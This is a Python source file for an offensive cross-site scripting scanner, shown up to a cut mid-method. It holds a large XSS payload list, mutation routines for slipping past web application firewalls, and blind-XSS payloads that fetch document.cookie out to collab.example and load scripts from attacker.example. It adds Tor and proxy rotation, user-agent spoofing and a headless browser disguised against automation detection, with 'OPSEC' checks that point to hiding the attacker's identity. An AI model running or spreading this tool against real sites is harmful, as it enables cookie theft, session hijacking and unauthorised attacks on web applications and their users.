import os
import re
import sys
import time
import json
import random
import string
import threading
import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from html.parser import HTMLParser


class C:
    R='\033[0m'; B='\033[1m'; D='\033[2m'
    RED='\033[91m'; GRN='\033[92m'; YEL='\033[93m'
    CYN='\033[96m'; WHT='\033[97m'
    GLD='\033[38;2;255;215;0m'
    PUR='\033[38;2;191;64;255m'
    NEO='\033[38;2;0;255;213m'
    CRM='\033[38;2;220;20;60m'


USE_BROWSER_VERIFY = {"enabled": False}
ALERT_TYPE = {"mode": "domain"}


def mutate_case(p, **k):
    return re.sub(r'[a-zA-Z]+',
                  lambda m: "".join(c.upper() if random.random() > .5 else c.lower() for c in m.group(0)), p)

def mutate_html_entity(p, **k):
    t = {"(":"&#40;",")":"&#41;","'":"&#39;",'"':"&#34;"}
    return "".join(t.get(c, c) for c in p)

def mutate_hex_entity(p, **k):
    t = {"a":"&#x61;","l":"&#x6c;","e":"&#x65;","r":"&#x72;","t":"&#x74;"}
    return "".join(t.get(c, c) for c in p)

def mutate_percent(p, **k):
    return "".join(f"%{ord(c):02X}" if (not c.isalnum() and c not in "/.-_" and random.random() > .5) else c for c in p)

def mutate_double_percent(p, **k):
    return "".join(f"%25{ord(c):02X}" if random.random() > .7 else (f"%{ord(c):02X}" if random.random() > .5 else c) for c in p)

def mutate_whitespace(p, **k):
    return p.replace(" ", random.choice(["\t","\n","\r","/","/*x*/","/**/","\x0c","%09","%0a"]))

def mutate_null_byte(p, **k):
    i = random.randint(0, max(0, len(p)-1))
    return p[:i] + "%00" + p[i:]

def mutate_slash(p, **k):
    return re.sub(r'\s+', lambda _: random.choice(["/*x*/","/**/","/","\t"]), p)

def mutate_unicode(p, **k):
    m = {"<":"\uff1c",">":"\uff1e","=":"\uff1d","(":"\uff08",")":"\uff09","'":"\uff07",'"':"\uff02"}
    return "".join(m.get(c, c) if random.random() > .7 else c for c in p)

def mutate_hex_js(p, **k):
    return re.sub(r'alert|eval|onload|onerror',
                  lambda m: "".join(f"\\x{ord(c):02x}" for c in m.group(0)), p, flags=re.I)

def mutate_unicode_js(p, **k):
    return re.sub(r'alert|eval',
                  lambda m: "".join(f"\\u{ord(c):04x}" for c in m.group(0)), p, flags=re.I)

def mutate_js_fragment(p, **k):
    def s(m):
        x = m.group(0); h = len(x)//2; return f"{x[:h]}'+'{x[h:]}"
    return re.sub(r'alert|eval', s, p, flags=re.I)

def mutate_bracket(p, **k):
    o = random.choice(["top","self","window","parent","this"])
    return re.sub(r'\balert\s*\(', f"{o}['al'+'ert'](", p)

def mutate_bracket_simple(p, **k):
    o = random.choice(["top","self","window"])
    return re.sub(r'\balert\s*\(', f"{o}['alert'](", p)

def mutate_atob(p, **k):
    import base64
    def e(m):
        b = base64.b64encode(f"alert('{m.group(1)}')".encode()).decode()
        return f"eval(atob('{b}'))"
    return re.sub(r"alert\(['\"]([^'\"]+)['\"]\)", e, p)

def mutate_backtick(p, **k):
    return re.sub(r"alert\((['\"])([^'\"]+)\1\)", r"alert`\2`", p)

def mutate_optional_chain(p, **k):
    return re.sub(r'\balert\s*\(', "alert?.(", p)

def mutate_tag_break(p, **k):
    return re.sub(r"<(\w+)", lambda m: f"<{m.group(1)}\n", p, count=1)

def mutate_attr_break(p, **k):
    return re.sub(r'(on\w+)',
                  lambda m: m.group(1)[:2] + random.choice(["\n","\t","/**/","/*x*/"]) + m.group(1)[2:],
                  p, flags=re.I)

def mutate_space_slash(p, **k):
    return p.replace("<svg ", "<svg/").replace("<img ", "<img/")

def mutate_no_quotes(p, **k):
    return p.replace("'x", "x").replace("'", "")


MUTATIONS = {
    "case": mutate_case, "html_entity": mutate_html_entity, "hex_entity": mutate_hex_entity,
    "percent": mutate_percent, "double_pct": mutate_double_percent,
    "whitespace": mutate_whitespace, "null_byte": mutate_null_byte,
    "slash": mutate_slash, "unicode": mutate_unicode, "hex_js": mutate_hex_js,
    "unicode_js": mutate_unicode_js, "js_fragment": mutate_js_fragment,
    "bracket": mutate_bracket, "bracket_simple": mutate_bracket_simple,
    "atob": mutate_atob, "backtick": mutate_backtick, "optional_chain": mutate_optional_chain,
    "tag_break": mutate_tag_break, "attr_break": mutate_attr_break,
    "space_slash": mutate_space_slash, "no_quotes": mutate_no_quotes,
}


def chain(p, techs):
    for t in techs:
        fn = MUTATIONS.get(t)
        if fn:
            try: p = fn(p)
            except Exception: pass
    return p


def generate_mixed(base, max_count=500):
    import itertools
    names = list(MUTATIONS.keys())
    res = []
    for n in names:
        p = chain(base, [n])
        if p != base: res.append((n, p))
    for a, b in itertools.combinations(names, 2):
        res.append((f"{a}+{b}", chain(base, [a, b])))
    triples = list(itertools.combinations(names, 3))
    random.shuffle(triples)
    for c in triples[:120]:
        res.append(("+".join(c), chain(base, list(c))))
    w = {"case":3,"whitespace":3,"html_entity":2,"percent":2,"slash":2,"attr_break":2,
         "tag_break":2,"hex_js":1,"js_fragment":1,"bracket":1,"atob":1,"unicode":1,
         "double_pct":1,"null_byte":1,"backtick":1,"space_slash":2,"no_quotes":1,
         "hex_entity":2,"unicode_js":1,"bracket_simple":1,"optional_chain":1}
    pool = list(w.keys()); ww = [w[k] for k in pool]
    while len(res) < max_count:
        k = random.randint(2, 6)
        combo = random.choices(pool, weights=ww, k=k)
        res.append(("+".join(combo), chain(base, combo)))
    seen = set(); out = []
    for tag, p in res:
        if p in seen: continue
        seen.add(p); out.append((tag, p))
    return out[:max_count]


def get_alert(m):
    mode = ALERT_TYPE["mode"]
    if mode == "domain":
        return "alert(document.domain)"
    if mode == "cookie":
        return "alert(document.cookie)"
    if mode == "location":
        return "alert(window.location.href)"
    if mode == "callback":
        return "fetch('//collab.example/'+document.cookie)"
    return f"alert('{m}')"


def base_payloads(m):
    a = get_alert(m)
    return [
        # ── Classic HTML ──
        f"<svg onload={a}>",
        f"<img src=x onerror={a}>",
        f"<body onload={a}>",
        f"<input autofocus onfocus={a}>",
        f"<details open ontoggle={a}>",
        f"<video><source onerror={a}>",
        f"<audio src=x onerror={a}>",
        f"<script>{a}</script>",
        f"<iframe srcdoc=\"<script>{a}</script>\">",
        f"<object data=\"javascript:{a}\">",

        # ── SVG / MathML (sanitizer bypass) ──
        f"<svg><script>{a}</script></svg>",
        f"<svg><animate onbegin={a} attributeName=x>",
        f"<svg><set attributeName=onmouseover onend={a}>",
        f"<math><mtext><table><mglyph><style><!--</style><img src=x onerror={a}>",
        f"<math><annotation-xml encoding=\"text/html\"><img src=x onerror={a}></annotation-xml>",

        # ── Attribute context ──
        f"\" autofocus onfocus={a} x=\"",
        f"\" onmouseover={a} x=\"",
        f"\" onpointerover={a} x=\"",
        f"'><svg/onload={a}>",
        f"\"><img src=x onerror={a}>",

        # ── JS context ──
        f"';{a}//",
        f"'-{a}-'",
        f"</script><script>{a}</script>",
        f"\\';{a}//",

        # ── URL context ──
        f"javascript:{a}",
        f"data:text/html,<script>{a}</script>",

        # ── CSP bypass ──
        f"<script src=\"//attacker.example/x.js\"></script>",
        f"<link rel=\"preload\" href=\"//attacker.example/x.js\" as=\"script\">",
        f"<base href=\"//attacker.example/\">",

        # ── Blind XSS ──
        f"<script src=\"//collab.example/x.js\"></script>",
        f"<img src=x onerror=\"fetch('//collab.example/'+btoa(document.cookie))\">",
    ]



def normalize_proxy(line):
    line = line.strip()
    if not line or line.startswith("#"): return None
    if "://" not in line:
        line = "http://" + line
    scheme = line.split("://", 1)[0].lower()
    if scheme not in ("http", "https", "socks4", "socks5"):
        return None
    return line


def load_proxies_file(path):
    if not os.path.exists(path): return []
    out = []
    with open(path, encoding="utf-8", errors="ignore") as f:
        for line in f:
            p = normalize_proxy(line)
            if p: out.append(p)
    return out


def load_proxies_pasted():
    print(f"\n{C.NEO}Paste proxies{C.R} {C.D}(one per line, empty line to finish){C.R}")
    proxies = []
    while True:
        try: line = input()
        except EOFError: break
        if not line.strip():
            if proxies: break
            continue
        p = normalize_proxy(line)
        if p:
            proxies.append(p)
            if len(proxies) % 100 == 0:
                print(f"{C.D}  ... {len(proxies)} loaded{C.R}")
    return proxies


def check_proxies(proxies, timeout=8):
    if not proxies: return []
    print(f"\n{C.NEO}Checking {len(proxies)} proxies...{C.R}")
    alive = []; lock = threading.Lock()

    def test(p):
        try:
            r = requests.get("http://httpbin.org/ip",
                             proxies={"http": p, "https": p},
                             timeout=timeout, verify=False)
            if r.status_code == 200:
                with lock: alive.append(p)
        except Exception: pass

    with ThreadPoolExecutor(max_workers=50) as ex:
        list(ex.map(test, proxies))
    print(f"{C.GRN}[+] Alive: {len(alive)}/{len(proxies)}{C.R}")
    return alive


class ProxyPool:
    def __init__(self, proxies):
        self.proxies = list(proxies)
        self.index = 0
        self.lock = threading.Lock()
        self.dead = set()
        self.assign = {}

    def get(self):
        if not self.proxies: return None
        with self.lock:
            ok = [p for p in self.proxies if p not in self.dead]
            if not ok: return None
            p = ok[self.index % len(ok)]; self.index += 1
            return p

    def get_for(self, payload):
        if not self.proxies: return None
        with self.lock:
            if payload in self.assign:
                p = self.assign[payload]
                if p not in self.dead:
                    return p
                self.index += 1
            ok = [p for p in self.proxies if p not in self.dead]
            if not ok: return None
            p = ok[self.index % len(ok)]
            self.index += 1
            self.assign[payload] = p
            return p

    def assign_batch(self, payloads):
        with self.lock:
            ok = [p for p in self.proxies if p not in self.dead]
            if not ok: return
            n = len(ok)
            self.assign.clear()
            for i, pl in enumerate(payloads):
                self.assign[pl] = ok[i % n]

    def mark_dead(self, p):
        with self.lock: self.dead.add(p)

    def alive(self):
        return len([p for p in self.proxies if p not in self.dead])

    def total(self):
        return len(self.proxies)


def ask_alert_type():
    print(f"\n{C.GLD}+{'-'*62}+{C.R}")
    print(f"{C.GLD}|{C.R}  {C.WHT}Alert type (payload PoC){C.R}")
    print(f"{C.GLD}|{C.R}  {C.GLD}1{C.R}  alert('mk...mk')             {C.D}unique marker{C.R}")
    print(f"{C.GLD}|{C.R}  {C.GLD}2{C.R}  alert(document.domain)       {C.D}professional{C.R}")
    print(f"{C.GLD}|{C.R}  {C.GLD}3{C.R}  alert(document.cookie)       {C.D}deep PoC{C.R}")
    print(f"{C.GLD}|{C.R}  {C.GLD}4{C.R}  alert(window.location.href)  {C.D}forensic{C.R}")
    print(f"{C.GLD}|{C.R}  {C.GLD}5{C.R}  fetch to callback server     {C.D}blind XSS{C.R}")
    print(f"{C.GLD}+{'-'*62}+{C.R}")
    print(f"{C.GLD}>>{C.R} ", end="")
    m = input().strip() or "2"
    ALERT_TYPE["mode"] = {"1":"unique","2":"domain","3":"cookie","4":"location","5":"callback"}.get(m, "domain")


def ask_proxies():
    print(f"\n{C.NEO}Use proxies?{C.R} {C.D}(y/n){C.R}: ", end="")
    if input().strip().lower() != "y":
        return ProxyPool([])

    print(f"\n{C.NEO}Proxy mode{C.R}")
    print(f"  {C.GLD}1{C.R}  Tor (socks5://127.0.0.1:9050)")
    print(f"  {C.GLD}2{C.R}  Load from file")
    print(f"  {C.GLD}3{C.R}  Paste directly")
    print(f"{C.GLD}>>{C.R} ", end="")
    mode = input().strip() or "2"

    proxies = []

    if mode == "1":
        print(f"  {C.NEO}Testing Tor...{C.R}")
        tor = "socks5://127.0.0.1:9050"
        try:
            r = requests.get("https://check.torproject.org/api/ip",
                             proxies={"http": tor, "https": tor},
                             timeout=10, verify=False)
            data = r.json()
            if data.get("IsTor"):
                print(f"  {C.GRN}[+] Tor active - IP: {data.get('IP')}{C.R}")
                proxies = [tor]
            else:
                print(f"  {C.CRM}[!] Not routed through Tor{C.R}")
                return ProxyPool([])
        except Exception as e:
            print(f"  {C.CRM}[!] Tor not running: {str(e)[:60]}{C.R}")
            return ProxyPool([])

    elif mode == "2":
        path = input(f"{C.NEO}Proxy file path{C.R}: ").strip().strip('"').strip("'")
        proxies = load_proxies_file(path)

    else:
        proxies = load_proxies_pasted()

    if not proxies:
        print(f"{C.CRM}[!] No proxies, running direct{C.R}")
        return ProxyPool([])

    print(f"\n{C.NEO}Validate before start?{C.R} {C.D}(y/n){C.R}: ", end="")
    if input().strip().lower() == "y":
        proxies = check_proxies(proxies)

    if not proxies:
        print(f"{C.CRM}[!] No alive proxies, running direct{C.R}")
        return ProxyPool([])

    print(f"  {C.GRN}[+] Pool ready: {len(proxies)} proxies{C.R}")
    return ProxyPool(proxies)


def ask_browser_verify():
    print(f"\n{C.GLD}+{'-'*62}+{C.R}")
    print(f"{C.GLD}|{C.R}  {C.WHT}Confirm XSS with Playwright (real browser)?{C.R}")
    print(f"{C.GLD}|{C.R}  {C.GRN}y{C.R} = yes (slower, accurate results)")
    print(f"{C.GLD}|{C.R}  {C.CRM}n{C.R} = no  (faster, reflection only)")
    print(f"{C.GLD}+{'-'*62}+{C.R}")
    print(f"{C.GLD}>>{C.R} ", end="")
    ans = input().strip().lower()
    return ans == "y"


def detect_context(html, marker):
    i = html.find(marker)
    if i == -1: return None
    b = html[max(0, i-200):i]
    if re.search(r'<script[^>]*>[^<]*$', b, re.I): return "inside_js"
    if re.search(r'on\w+\s*=\s*["\'][^"\']*$', b, re.I): return "inside_event"
    if re.search(r'href\s*=\s*["\'][^"\']*$', b, re.I): return "inside_href"
    if re.search(r'src\s*=\s*["\'][^"\']*$', b, re.I): return "inside_src"
    if re.search(r'<[^>]*\s\w+\s*=\s*["\'][^"\']*$', b, re.I): return "inside_attr"
    if re.search(r'<!--[^>]*$', b): return "inside_comment"
    return "html_body"


def real_severity(c):
    if c in ("inside_js","inside_event"): return "HIGH"
    if c in ("inside_href","inside_src","html_body","inside_attr"): return "MEDIUM"
    return "LOW"


USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
]


def _parse_proxy_for_playwright(proxy):
    try:
        p = urlparse(proxy)
        scheme = p.scheme or "http"
        host = p.hostname
        port = p.port
        if not host or not port:
            return {"server": proxy}
        cfg = {"server": f"{scheme}://{host}:{port}"}
        if p.username: cfg["username"] = p.username
        if p.password: cfg["password"] = p.password
        return cfg
    except Exception:
        return {"server": proxy}


def verify_with_browser(url, field, payload, proxy=None, user_agent=None, timeout=8):
    if not proxy:
        print(f"  {C.CRM}[!] OPSEC: No proxy for browser verify - SKIPPED{C.R}")
        return None

    try:
        from playwright.sync_api import sync_playwright
    except ImportError:
        print(f"  {C.YEL}[!] Playwright not installed: pip install playwright{C.R}")
        return None

    hit = {"fired": False}
    ua = user_agent or random.choice(USER_AGENTS)
    proxy_cfg = _parse_proxy_for_playwright(proxy)

    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(
                headless=True,
                proxy=proxy_cfg,
                args=[
                    "--disable-blink-features=AutomationControlled",
                    "--no-sandbox",
                    "--disable-dev-shm-usage",
                ],
            )
            ctx = browser.new_context(
                user_agent=ua,
                viewport={"width": 1366, "height": 768},
                locale="en-US",
                ignore_https_errors=True,
            )
            ctx.add_init_script("""
                Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
                try { delete navigator.__proto__.webkitRTCPeerConnection; } catch(e) {}
                try { window.RTCPeerConnection = undefined; } catch(e) {}
            """)

            page = ctx.new_page()
            page.on("dialog", lambda d: (hit.update(fired=True), d.dismiss()))
            page.on("pageerror", lambda e: hit.update(fired=True))

            p_url = urlparse(url)
            q = parse_qs(p_url.query, keep_blank_values=True)
            q[field] = [payload]
            test_url = urlunparse(p_url._replace(query=urlencode(q, doseq=True)))

            try:
                page.goto(test_url, timeout=timeout * 1000, wait_until="domcontentloaded")
                page.wait_for_timeout(1500)
            except Exception:
                pass

            ctx.close()
            browser.close()
    except Exception as e:
        print(f"  {C.D}[?] Browser error: {str(e)[:80]}{C.R}")
        return None

    return hit["fired"]


class BypassScanner:
    def __init__(self, url, method="GET", data=None, pool=None,
                 threads=5, delay=0.2, timeout=10, batch_size=0):
        parsed = urlparse(url)
        if parsed.scheme not in ("http","https") or not parsed.netloc:
            raise ValueError("Invalid URL")
        self.url = url
        self.method = method.upper()
        self.base_data = dict(data or {})
        self.pool = pool or ProxyPool([])
        self.threads = max(1, min(20, int(threads)))
        self.delay = max(0.0, float(delay))
        self.timeout = float(timeout)
        self.batch_size = int(batch_size)

        if self.method == "GET":
            params = parse_qs(parsed.query, keep_blank_values=True)
            self.fields = list(params.keys()) if params else list(self.base_data.keys())
        else:
            self.fields = list(self.base_data.keys())
        if not self.fields: raise ValueError("No fields")

        self.results = []
        self.lock = threading.Lock()
        self.counter = {"sent":0,"errors":0,"ok":0,"blocked":0,"reflected":0,"verified":0}
        self.waf_hits = {}
        self.marker = "mk" + "".join(random.choices(string.ascii_lowercase, k=6)) + "mk"
        self.last = 0.0
        self.rl_lock = threading.Lock()

    def _rate(self):
        with self.rl_lock:
            now = time.monotonic()
            slot = max(now, self.last + self.delay)
            self.last = slot
        w = slot - time.monotonic()
        if w > 0: time.sleep(w)

    def _build(self, field, payload):
        if self.method == "GET":
            p = urlparse(self.url)
            q = parse_qs(p.query, keep_blank_values=True)
            q[field] = [payload]
            return urlunparse(p._replace(query=urlencode(q, doseq=True))), None
        d = dict(self.base_data); d[field] = payload
        return self.url, d

    def _one(self, field, payload, tag):
        self._rate()
        proxy = self.pool.get_for(payload)
        pd = {"http": proxy, "https": proxy} if proxy else None
        target, data = self._build(field, payload)
        h = {"User-Agent": random.choice(USER_AGENTS)}

        last = None
        for _ in range(2):
            with self.lock: self.counter["sent"] += 1
            try:
                if self.method == "GET":
                    r = requests.get(target, proxies=pd, timeout=self.timeout,
                                     verify=False, allow_redirects=False, headers=h)
                else:
                    r = requests.post(target, data=data, proxies=pd, timeout=self.timeout,
                                      verify=False, allow_redirects=False, headers=h)

                if r.status_code in (403,406,429,503):
                    with self.lock:
                        self.counter["blocked"] += 1
                        self.waf_hits[tag] = self.waf_hits.get(tag, 0) + 1
                    continue

                with self.lock: self.counter["ok"] += 1

                ctx = None; ev = None; reflected = False
                if payload in r.text:
                    reflected = True
                    ctx = detect_context(r.text, payload)
                    i = r.text.find(payload)
                    ev = r.text[max(0, i-30):i+len(payload)+30]
                elif self.marker in r.text:
                    ctx = detect_context(r.text, self.marker)
                    i = r.text.find(self.marker)
                    ev = r.text[max(0, i-30):i+len(self.marker)+30]

                if reflected:
                    with self.lock: self.counter["reflected"] += 1
                    sev = real_severity(ctx)
                    confirmed = None

                    if sev == "HIGH" and self.method == "GET" and USE_BROWSER_VERIFY["enabled"]:
                        print(f"  {C.GLD}[?] Verifying with browser (proxy: {proxy})...{C.R}")
                        confirmed = verify_with_browser(
                            self.url, field, payload,
                            proxy=proxy, user_agent=h["User-Agent"]
                        )
                        if confirmed is True:
                            with self.lock: self.counter["verified"] += 1
                            print(f"  {C.GRN}[+] CONFIRMED XSS!{C.R}")
                        elif confirmed is False:
                            print(f"  {C.YEL}[-] Reflection only (not executed){C.R}")
                        else:
                            print(f"  {C.D}[?] Verification skipped/error{C.R}")

                    entry = {"tag":tag,"field":field,"method":self.method,"payload":payload,
                             "context":ctx,"status":r.status_code,"severity":sev,
                             "evidence":ev,"confirmed":confirmed,"proxy":proxy}
                    with self.lock: self.results.append(entry)
                    last = entry

            except requests.exceptions.ProxyError:
                if proxy: self.pool.mark_dead(proxy)
                with self.lock: self.counter["errors"] += 1
                break
            except requests.exceptions.Timeout:
                with self.lock: self.counter["errors"] += 1
            except Exception:
                with self.lock: self.counter["errors"] += 1
        return last

    def _manual_loop(self, tasks, on_result=None):
        print(f"\n{C.GLD}Manual: Enter=send, a=auto-all, q=quit{C.R}\n")
        auto = False
        for i, (field, payload, tag) in enumerate(tasks, 1):
            if not auto:
                print(f"{C.NEO}[{i}/{len(tasks)}]{C.R} {C.WHT}{tag[:60]}{C.R}")
                print(f"     {C.CYN}{payload[:120]}{C.R}")
                cmd = input(f"{C.GLD}[Enter/a/q]{C.R}: ").strip().lower()
                if cmd == "q": break
                if cmd == "a": auto = True
            res = self._one(field, payload, tag)
            if res and on_result: on_result(res)

    def scan(self, on_result=None, manual=False):
        print(f"  {C.NEO}Generating mega-mix payloads...{C.R}")
        bases = base_payloads(self.marker)
        all_v = []
        per_base = max(20, 800 // len(bases))
        for b in bases:
            all_v.extend(generate_mixed(b, max_count=per_base))
        random.shuffle(all_v)

        tasks_all = [(f, p, t) for f in self.fields for t, p in all_v]
        total = len(tasks_all)
        n_proxies = self.pool.total()

        print(f"  {C.GRN}[+] {len(all_v)} unique payloads x {len(self.fields)} fields = {total} payloads{C.R}")
        print(f"  {C.NEO}Fields:{C.R} {', '.join(self.fields)}")
        print(f"  {C.NEO}Proxies:{C.R} {n_proxies} (alive: {self.pool.alive()})")
        print(f"  {C.NEO}Delay:{C.R} {self.delay}s")

        if manual:
            self._manual_loop(tasks_all, on_result)
            return self.results

        if n_proxies > 0:
            chunks = [tasks_all[i:i+n_proxies] for i in range(0, total, n_proxies)]
            print(f"  {C.NEO}Rounds:{C.R} {len(chunks)} (each round = {n_proxies} payloads on {n_proxies} proxies, 2x each)\n")
            for r_idx, chunk in enumerate(chunks, 1):
                payloads = [p for _, p, _ in chunk]
                self.pool.assign_batch(payloads)
                print(f"\n{C.GLD}--- Round {r_idx}/{len(chunks)} ({len(chunk)} payloads, 2x each = {len(chunk)*2} req) ---{C.R}")
                with ThreadPoolExecutor(max_workers=self.threads) as ex:
                    futures = [ex.submit(self._one, f, p, t) for f, p, t in chunk]
                    for fut in as_completed(futures):
                        try:
                            res = fut.result()
                            if res and on_result: on_result(res)
                        except Exception:
                            with self.lock: self.counter["errors"] += 1
                if self.pool.alive() == 0:
                    print(f"{C.CRM}[!] All proxies dead{C.R}"); break
                print(f"{C.D}  stats: sent={self.counter['sent']} ok={self.counter['ok']} "
                      f"blocked={self.counter['blocked']} found={len(self.results)} verified={self.counter['verified']}{C.R}")
        else:
            if self.batch_size > 0:
                print(f"  {C.NEO}Batch:{C.R} {self.batch_size} per round\n")
                for i in range(0, total, self.batch_size):
                    chunk = tasks_all[i:i+self.batch_size]
                    print(f"\n{C.GLD}--- Batch {i//self.batch_size + 1} ({len(chunk)} payloads, 2x each) ---{C.R}")
                    with ThreadPoolExecutor(max_workers=self.threads) as ex:
                        futures = [ex.submit(self._one, f, p, t) for f, p, t in chunk]
                        for fut in as_completed(futures):
                            try:
                                res = fut.result()
                                if res and on_result: on_result(res)
                            except Exception:
                                with self.lock: self.counter["errors"] += 1
                    print(f"{C.D}  stats: sent={self.counter['sent']} ok={self.counter['ok']} "
                          f"blocked={self.counter['blocked']} found={len(self.results)}{C.R}")
            else:
                print(f"  {C.NEO}Estimated: ~{total * self.delay * 2:.0f}s{C.R}\n")
                with ThreadPoolExecutor(max_workers=self.threads) as ex:
                    futures = [ex.submit(self._one, f, p, t) for f, p, t in tasks_all]
                    for fut in as_completed(futures):
                        try:
                            res = fut.result()
                            if res and on_result: on_result(res)
                        except Exception:
                            with self.lock: self.counter["errors"] += 1
        return self.results


class AdaptiveBypass:
    def __init__(self, url, method="GET", data=None, pool=None,
                 threads=5, delay=0.3, timeout=10):
        self.url = url
        self.method = method.upper()
        self.base_data = dict(data or {})
        self.pool = pool or ProxyPool([])
        self.threads = max(1, min(20, int(threads)))
        self.delay = max(0.0, float(delay))
        self.timeout = float(timeout)

        if self.method == "GET":
            parsed = urlparse(url)
            params = parse_qs(parsed.query, keep_blank_values=True)
            self.fields = list(params.keys()) if params else list(self.base_data.keys())
        else:
            self.fields = list(self.base_data.keys())
        if not self.fields: raise ValueError("No fields")

        self.field = self.fields[0]
        self.marker = "mk" + "".join(random.choices(string.ascii_lowercase, k=6)) + "mk"
        self.results = []
        self.lock = threading.Lock()
        self.counter = {"sent":0,"ok":0,"blocked":0,"errors":0,"reflected":0,"verified":0}
        self.working = []
        self.blocked_list = []
        self.last = 0.0

    def _rate(self):
        with self.lock:
            now = time.monotonic()
            slot = max(now, self.last + self.delay)
            self.last = slot
        w = slot - time.monotonic()
        if w > 0: time.sleep(w)

    def _build(self, field, payload):
        if self.method == "GET":
            p = urlparse(self.url)
            q = parse_qs(p.query, keep_blank_values=True)
            q[field] = [payload]
            return urlunparse(p._replace(query=urlencode(q, doseq=True))), None
        d = dict(self.base_data); d[field] = payload
        return self.url, d

    def _one(self, payload, tag="probe"):
        self._rate()
        proxy = self.pool.get_for(payload)
        pd = {"http": proxy, "https": proxy} if proxy else None
        target, data = self._build(self.field, payload)
        h = {"User-Agent": random.choice(USER_AGENTS)}

        last = None
        for _ in range(2):
            with self.lock: self.counter["sent"] += 1
            try:
                if self.method == "GET":
                    r = requests.get(target, proxies=pd, timeout=self.timeout,
                                     verify=False, allow_redirects=False, headers=h)
                else:
                    r = requests.post(target, data=data, proxies=pd, timeout=self.timeout,
                                      verify=False, allow_redirects=False, headers=h)

                blocked = r.status_code in (403, 406, 429, 503)
                if blocked:
                    with self.lock: self.counter["blocked"] += 1
                    last = {"status": r.status_code, "blocked": True,
                            "reflected": False, "context": None,
                            "payload": payload, "tag": tag}
                    continue

                with self.lock: self.counter["ok"] += 1

                reflected = payload in r.text or self.marker in r.text
                ctx = None
                if reflected:
                    key = payload if payload in r.text else self.marker
                    ctx = detect_context(r.text, key)
                    with self.lock: self.counter["reflected"] += 1

                last = {"status": r.status_code, "blocked": False,
                        "reflected": reflected, "context": ctx,
                        "payload": payload, "tag": tag}

                if reflected and real_severity(ctx) == "HIGH" and self.method == "GET" and proxy and USE_BROWSER_VERIFY["enabled"]:
                    print(f"  {C.GLD}[?] Verifying with browser...{C.R}")
                    confirmed = verify_with_browser(
                        self.url, self.field, payload,
                        proxy=proxy, user_agent=h["User-Agent"]
                    )
                    last["confirmed"] = confirmed
                    if confirmed is True:
                        with self.lock: self.counter["verified"] += 1
                        print(f"  {C.GRN}[+] CONFIRMED XSS!{C.R}")
                    elif confirmed is False:
                        print(f"  {C.YEL}[-] Reflection only{C.R}")

            except requests.exceptions.ProxyError:
                if proxy: self.pool.mark_dead(proxy)
                with self.lock: self.counter["errors"] += 1
                last = {"status":0,"blocked":False,"reflected":False,
                        "context":None,"payload":payload,"tag":tag,"error":"proxy"}
                break
            except Exception:
                with self.lock: self.counter["errors"] += 1
                last = {"status":0,"blocked":False,"reflected":False,
                        "context":None,"payload":payload,"tag":tag,"error":"exc"}
        return last

    def _add_finding(self, tag, payload, ctx, status, confirmed=None):
        entry = {"tag": tag, "field": self.field, "method": self.method,
                 "payload": payload, "context": ctx, "status": status,
                 "severity": real_severity(ctx), "evidence": None,
                 "confirmed": confirmed}
        with self.lock: self.results.append(entry)

    def _probe_base(self):
        print(f"  {C.NEO}Probing baseline...{C.R}")
        base = f"<script>{get_alert(self.marker)}</script>"
        r = self._one(base, "baseline")
        if r.get("blocked"):
            print(f"  {C.YEL}[!] Baseline BLOCKED ({r['status']}) - WAF active{C.R}")
            return False
        if r.get("reflected"):
            print(f"  {C.GRN}[+] Baseline REFLECTED - XSS likely{C.R}")
            self._add_finding("baseline", base, r["context"], r["status"], r.get("confirmed"))
            return True
        print(f"  {C.GRN}[+] Baseline passed (no reflection){C.R}")
        return True

    def _probe_techniques(self):
        print(f"\n  {C.NEO}Probing {len(MUTATIONS)} techniques...{C.R}\n")
        base = f"<svg onload={get_alert(self.marker)}>"
        items = list(MUTATIONS.items())
        random.shuffle(items)

        for i, (name, fn) in enumerate(items, 1):
            try: mutated = fn(base)
            except Exception: continue
            r = self._one(mutated, name)
            if r.get("blocked"):
                self.blocked_list.append(name)
                print(f"  {C.CRM}[{i:>2}/{len(items)}] {name:<15} -> BLOCKED ({r['status']}){C.R}")
            elif r.get("error"):
                print(f"  {C.D}[{i:>2}/{len(items)}] {name:<15} -> error{C.R}")
            else:
                self.working.append(name)
                ref = "REFLECTED" if r.get("reflected") else "passed"
                print(f"  {C.GRN}[{i:>2}/{len(items)}] {name:<15} -> OK ({ref}){C.R}")
                if r.get("reflected"):
                    self._add_finding(name, mutated, r["context"], r["status"], r.get("confirmed"))
        return self.working

    def _chain_working(self):
        if len(self.working) < 2: return
        print(f"\n  {C.NEO}Chaining working techniques...{C.R}\n")
        import itertools
        base = f"<img src=x onerror={get_alert(self.marker)}>"
        pairs = list(itertools.combinations(self.working, 2))
        random.shuffle(pairs)
        pairs = pairs[:40]

        for i, combo in enumerate(pairs, 1):
            try: mutated = chain(base, list(combo))
            except Exception: continue
            r = self._one(mutated, "+".join(combo))
            if not r.get("blocked") and not r.get("error"):
                ref = "REFLECTED" if r.get("reflected") else "passed"
                print(f"  {C.GRN}[{i:>2}/{len(pairs)}] {'+'.join(combo):<40} -> OK ({ref}){C.R}")
                if r.get("reflected"):
                    self._add_finding("+".join(combo), mutated, r["context"], r["status"], r.get("confirmed"))

    def _escalate(self):
        print(f"\n  {C.NEO}Escalating with heavy combos...{C.R}\n")
        bases = base_payloads(self.marker)
        heavy_sets = [
            ["case","whitespace","html_entity","hex_js"],
            ["percent","double_pct","unicode","slash"],
            ["js_fragment","bracket","atob","case"],
            ["tag_break","attr_break","slash","case","whitespace"],
            ["null_byte","percent","hex_js","js_fragment"],
            ["case","html_entity","bracket","atob","space_slash"],
            ["hex_entity","unicode_js","optional_chain","case"],
        ]
        for i, techs in enumerate(heavy_sets, 1):
            for base in random.sample(bases, min(3, len(bases))):
                try: mutated = chain(base, techs)
                except Exception: continue
                r = self._one(mutated, "+".join(techs))
                if not r.get("blocked") and not r.get("error"):
                    ref = "REFLECTED" if r.get("reflected") else "passed"
